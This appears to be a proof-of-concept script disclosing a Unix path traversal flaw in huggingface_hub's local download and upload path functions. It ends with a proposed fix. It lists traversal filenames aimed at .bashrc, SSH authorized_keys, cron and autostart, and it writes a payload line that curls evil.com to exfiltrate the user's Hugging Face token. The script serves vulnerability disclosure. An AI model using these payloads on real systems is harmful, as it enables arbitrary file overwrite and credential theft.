#!/usr/bin/env python3
"""
VULN-001: Path Traversal on Unix Systems in huggingface_hub
============================================================

Affected files:
  - src/huggingface_hub/_local_folder.py:210-216  (get_local_download_paths)
  - src/huggingface_hub/_local_folder.py:250-256  (get_local_upload_paths)
  - src/huggingface_hub/file_download.py:1035-1041 (_hf_hub_download_to_cache_dir)

Root cause:
  Path traversal validation for ".." is only performed on Windows (os.name == "nt").
  On Linux/macOS, filenames like "../../etc/cron.d/evil" pass through unchecked.

  The vulnerable code:
    sanitized_filename = os.path.join(*filename.split("/"))
    if os.name == "nt":                      # <-- ONLY Windows!
        if sanitized_filename.startswith("..\\") or "\\..\\" in sanitized_filename:
            raise ValueError(...)
    file_path = local_dir / sanitized_filename   # <-- path traversal on Unix
    file_path.parent.mkdir(parents=True, exist_ok=True)  # <-- creates escaped dirs

Attack scenario:
  A malicious HF repository contains a file named "../../.bashrc".
  When a victim runs: hf_hub_download(repo_id="evil/repo", local_dir="./models")
  The file is written to ../../.bashrc relative to ./models — overwriting the
  victim's shell configuration.
"""

import os
import sys
import tempfile
import shutil
from pathlib import Path

# ─── Color helpers ───────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def header(msg):
    print(f"\n{BOLD}{CYAN}{'='*70}")
    print(f"  {msg}")
    print(f"{'='*70}{RESET}\n")

def ok(msg):
    print(f"  {GREEN}[✓]{RESET} {msg}")

def vuln(msg):
    print(f"  {RED}[✗ VULNERABLE]{RESET} {msg}")

def info(msg):
    print(f"  {YELLOW}[i]{RESET} {msg}")


# ─── Precondition check ─────────────────────────────────────────────────────
header("VULN-001 PoC: Path Traversal on Unix")

info(f"Platform: {os.name} ({os.uname().sysname} {os.uname().release})")
info(f"Python:   {sys.version.split()[0]}")

if os.name == "nt":
    print(f"\n  {RED}This vulnerability only affects Unix (Linux/macOS).{RESET}")
    print(f"  On Windows, the validation IS present and blocks '..' sequences.")
    sys.exit(1)

ok("Running on Unix — the vulnerable code path is active\n")


# ─── Import the vulnerable functions ─────────────────────────────────────────
from huggingface_hub._local_folder import get_local_download_paths, get_local_upload_paths


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 1: Basic path traversal — file_path escapes local_dir
# ═══════════════════════════════════════════════════════════════════════════════
header("TEST 1: Path traversal — file_path escapes local_dir")

info("Calling: get_local_download_paths(Path('/tmp/safe_dir'), '../../tmp/evil_file')")

try:
    paths = get_local_download_paths(Path("/tmp/safe_dir"), "../../tmp/evil_file")
    vuln(f"file_path returned:  {paths.file_path}")
    vuln(f"file_path resolved:  {paths.file_path.resolve()}")
    info(f"Expected inside:     /tmp/safe_dir/")
    
    safe = Path("/tmp/safe_dir").resolve()
    actual = paths.file_path.resolve()
    if not str(actual).startswith(str(safe) + "/"):
        vuln(f"Path ESCAPES safe_dir → resolves to {actual}")
    else:
        ok("Path stays within safe_dir (not exploitable)")
except ValueError as e:
    ok(f"BLOCKED by validation: {e}")

# Cleanup the dir that was created
shutil.rmtree("/tmp/safe_dir", ignore_errors=True)


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 2: Deep traversal to sensitive system paths
# ═══════════════════════════════════════════════════════════════════════════════
header("TEST 2: Deep traversal to sensitive system paths")

test_cases = [
    ("../../.bashrc",                "Overwrite victim's .bashrc"),
    ("../../.ssh/authorized_keys",   "Inject SSH authorized key"),
    ("../../../etc/cron.d/evil",     "Create cron job (if root)"),
    ("../../.config/autostart/evil", "XDG autostart persistence"),
]

for malicious_filename, description in test_cases:
    info(f"filename = '{malicious_filename}'  ({description})")
    try:
        paths = get_local_download_paths(Path("/tmp/safe_dir"), malicious_filename)
        resolved = paths.file_path.resolve()
        vuln(f"  → resolves to: {resolved}")
    except ValueError as e:
        ok(f"  → BLOCKED: {e}")
    shutil.rmtree("/tmp/safe_dir", ignore_errors=True)


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 3: Actual file write outside safe_dir (full exploit)
# ═══════════════════════════════════════════════════════════════════════════════
header("TEST 3: Full exploit — actual file write OUTSIDE safe_dir")

# Create a controlled temp environment
workdir = tempfile.mkdtemp(prefix="vuln001_")
safe_dir = Path(workdir) / "models" / "my-model"
safe_dir.mkdir(parents=True)
target_file = Path(workdir) / "PWNED.txt"

info(f"Work directory:  {workdir}")
info(f"Safe directory:  {safe_dir}")
info(f"Target file:     {target_file} (should NOT be writable from safe_dir)")
print()

# Step 1: get_local_download_paths with traversal
malicious_name = "../../PWNED.txt"
info(f"Step 1: get_local_download_paths(safe_dir, '{malicious_name}')")

paths = get_local_download_paths(safe_dir, malicious_name)
info(f"  file_path returned: {paths.file_path}")
info(f"  file_path resolved: {paths.file_path.resolve()}")
print()

# Step 2: Simulate what the download code does — write to file_path
info("Step 2: Writing malicious content to paths.file_path (simulating download)")
info("  This replicates what file_download.py:1386 does:")
info("    shutil.copyfile(cached_path, paths.file_path)")
print()

# The parent directory was already created by get_local_download_paths (line 229)
paths.file_path.write_text("#!/bin/bash\ncurl https://evil.com/exfil?token=$(cat ~/.cache/huggingface/token)\n")
ok(f"  Wrote to: {paths.file_path}")
ok(f"  Resolved: {paths.file_path.resolve()}")
print()

# Step 3: Verify the file was written OUTSIDE safe_dir
info("Step 3: Verification")

if target_file.exists():
    vuln(f"File exists at {target_file} — OUTSIDE the safe directory!")
    vuln(f"Content:")
    for line in target_file.read_text().splitlines():
        print(f"         {RED}{line}{RESET}")
    print()
    
    # Show it's truly outside
    info(f"safe_dir: {safe_dir}")
    info(f"file at:  {target_file}")
    info(f"Is inside safe_dir? {str(target_file).startswith(str(safe_dir))}")
    vuln("File was written OUTSIDE the safe download directory!")
else:
    ok(f"File does NOT exist at {target_file} — exploit failed")

# Also check what directories were created
info(f"\nDirectory listing of {workdir}:")
for root, dirs, files in os.walk(workdir):
    level = root.replace(workdir, "").count(os.sep)
    indent = " " * 2 * level
    print(f"    {indent}{os.path.basename(root)}/")
    subindent = " " * 2 * (level + 1)
    for file in files:
        filepath = os.path.join(root, file)
        print(f"    {subindent}{file}  ({os.path.getsize(filepath)} bytes)")


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 4: get_local_upload_paths is also vulnerable
# ═══════════════════════════════════════════════════════════════════════════════
header("TEST 4: get_local_upload_paths is ALSO vulnerable")

upload_safe = Path(workdir) / "upload_safe"
upload_safe.mkdir(parents=True)

try:
    upload_paths = get_local_upload_paths(upload_safe, "../../UPLOAD_PWNED.txt")
    vuln(f"file_path: {upload_paths.file_path}")
    vuln(f"resolved:  {upload_paths.file_path.resolve()}")
except ValueError as e:
    ok(f"BLOCKED: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 5: Contrast with Windows behavior (shows the fix exists but is gated)
# ═══════════════════════════════════════════════════════════════════════════════
header("TEST 5: The fix exists in the code — but only for Windows")

import inspect
source = inspect.getsource(get_local_download_paths)
lines = source.split("\n")
for i, line in enumerate(lines):
    if "os.name" in line or '".."' in line or "startswith" in line or "raise ValueError" in line:
        marker = f"{RED}  >>>{RESET}" if "nt" in line else "     "
        print(f"  {marker} {line.rstrip()}")

print(f"\n  {RED}The 'if os.name == \"nt\"' guard means this validation")
print(f"  is SKIPPED entirely on Linux and macOS.{RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
# Cleanup
# ═══════════════════════════════════════════════════════════════════════════════
header("CLEANUP")
shutil.rmtree(workdir)
shutil.rmtree("/tmp/safe_dir", ignore_errors=True)
ok(f"Removed {workdir}")


# ═══════════════════════════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════════════════════════
header("SUMMARY")
print(f"""  {RED}{BOLD}VULNERABILITY CONFIRMED{RESET}

  {BOLD}What:{RESET}    get_local_download_paths() and get_local_upload_paths() in
           _local_folder.py do not validate '..' path components on Unix.

  {BOLD}Where:{RESET}   src/huggingface_hub/_local_folder.py lines 210-216, 250-256
           src/huggingface_hub/file_download.py lines 1035-1041

  {BOLD}How:{RESET}     A malicious HF repo with a file named "../../.bashrc" causes
           the download to escape the local_dir and overwrite arbitrary files.

  {BOLD}Who:{RESET}     Any user running hf_hub_download() with local_dir on Linux/macOS.
           This includes:
             - hf_hub_download(repo_id="evil/repo", local_dir="./models")
             - snapshot_download(repo_id="evil/repo", local_dir="./models")
             - huggingface-cli download evil/repo --local-dir ./models

  {BOLD}Impact:{RESET}  Arbitrary file write → code execution via .bashrc, .profile,
           .ssh/authorized_keys, crontab, XDG autostart, etc.

  {BOLD}Fix:{RESET}     Remove the 'if os.name == "nt"' guard so the '..' validation
           runs on ALL platforms:

           sanitized_filename = os.path.join(*filename.split("/"))
           {RED}- if os.name == "nt":{RESET}
           {RED}-     if sanitized_filename.startswith("..\\\\") or "\\\\..\\\\" in sanitized_filename:{RESET}
           {GREEN}+ if ".." in sanitized_filename.split(os.sep):{RESET}
               raise ValueError(...)
""")
